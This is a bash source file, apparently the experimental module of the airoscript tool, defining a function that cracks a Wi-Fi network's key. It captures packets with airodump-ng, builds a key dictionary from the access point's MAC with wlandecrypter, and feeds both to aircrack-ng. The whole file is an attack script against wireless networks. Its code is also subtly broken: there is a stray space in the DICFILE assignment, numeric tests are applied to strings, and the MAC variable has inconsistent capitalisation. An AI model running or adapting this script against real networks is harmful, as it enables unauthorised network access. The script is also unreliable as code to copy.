#!/bin/bash
# Unstable functions file for airoscript.
# Requires: wlandecrypter 
# By David Francos (XayOn) <yo.orco@gmail.com>
echo -e "\tUnstable functions from airoscript loaded,\n\tif you don't want this, set UNSTABLE=0 in\n\tconfig file"

function wld {
# Here goes, if no host_mac is present, ask for it. Hope it's OK.	
	if [ $Host_MAC ] 
	then

		CAPFILE=`mktemp -p $DUMP_PATH`
		DICFILE= `mktemp -p $DUMP_PATH`
			echo  "######################################"
			echo  "##Do you want to specify a channel? ##"
			echo  "##If so, enter the channel, if not, ##"
			echo  "##leave it empty and press enter.   ##"
			echo  "######################################"

			read CHANNEL
				if [ $CHANNEL -ne "" ]
				then
					OPT="--channel "
				fi

			echo -e "I'm going to launch airodump now, when you\n get sufficent iv's, stop it" 

			sleep 2 
			if [ "$HOST_SSID" -ne "" ] # FIXME replace this for a case with all the supported types or something
			then
				airodump-ng -w $CAPFILE  $OPT $CHANNEL $WIFI
				clear 
				wlandecrypter $Host_MAC $WLAN_KIND $DICFILE 
				aircrack-ng -b $HOST_MAC -w $DICFILE $CAPFILE 
			else
				echo "No valid ssid detected, your target must be\n supported by wlandecrypter"
			fi
	
	else
		clear
		echo -e "Error: You must select a client before performing this cracking.\n"
	fi
	
}
